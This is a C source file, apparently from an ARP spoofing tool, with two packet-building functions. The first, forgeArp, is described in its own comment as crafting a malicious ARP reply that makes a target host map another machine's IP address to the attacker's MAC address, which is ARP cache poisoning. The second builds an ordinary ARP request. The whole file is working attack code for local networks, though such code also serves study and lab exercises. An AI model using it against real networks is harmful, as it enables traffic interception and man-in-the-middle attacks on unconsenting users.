#include "arp.h"

#include <arpa/inet.h>
#include <string.h>

/*
 * Crafts a malicious arp packet. Will make the host specified by dstIp and dstMac believe that
 * srcIp has the mac address atkMac.
 *
 * Params:
 *      const unsigned char *atkMac: The mac address of the attacker machine.
 *
 *      const struct in_addr *srcIp: The ip address of the machine the attacker will pose as.
 *
 *      const unsigned char *dstMac: The mac address of the destination host to trick.
 *
 *      const struct in_addr *dstIp: The ip address of the destination host to trick.
 *
 *      arphdr_t arpPkt: The arp packet header to fill.
 */
void forgeArp(const unsigned char *atkMac, const struct in_addr *srcIp, const unsigned char *dstMac,
              const struct in_addr *dstIp, struct arp_header *arpPkt) {
    arpPkt->arp_hd = htons(ARPHRD_ETHER);
    arpPkt->arp_pr = htons(ETH_P_IP);
    arpPkt->arp_hdl = ETH_ALEN;
    arpPkt->arp_prl = 4;
    arpPkt->arp_op = htons(ARPOP_REPLY);
    memcpy(arpPkt->arp_sha, atkMac, ETH_ALEN);
    memcpy(arpPkt->arp_spa, &srcIp->s_addr, 4);
    memcpy(arpPkt->arp_dha, dstMac, ETH_ALEN);
    memcpy(arpPkt->arp_dpa, &dstIp->s_addr, 4);
}

/*
 * Creates an ARP request with the given values.
 *
 * Params:
 *      const struct in_addr *query: The IP address that will be resolved to a MAC address.
 *
 *      const struct in_addr *ip: The sender IP address.
 *
 *      const unsigned char *mac: The sender MAC address.
 *
 *      struct arp_header *arpPkt: The ARP packet to fill.
 */
void craftArpRequest(const struct in_addr *query, const struct in_addr *ip,
                     const unsigned char *mac, struct arp_header *arpPkt) {
    arpPkt->arp_hd = htons(ARPHRD_ETHER);
    arpPkt->arp_pr = htons(ETH_P_IP);
    arpPkt->arp_hdl = ETH_ALEN;
    arpPkt->arp_prl = 4;
    arpPkt->arp_op = htons(ARPOP_REQUEST);
    memcpy(arpPkt->arp_sha, mac, ETH_ALEN);
    memcpy(arpPkt->arp_spa, &ip->s_addr, 4);
    memset(arpPkt->arp_dha, 0xFF, ETH_ALEN);
    memcpy(arpPkt->arp_dpa, &query->s_addr, 4);
}
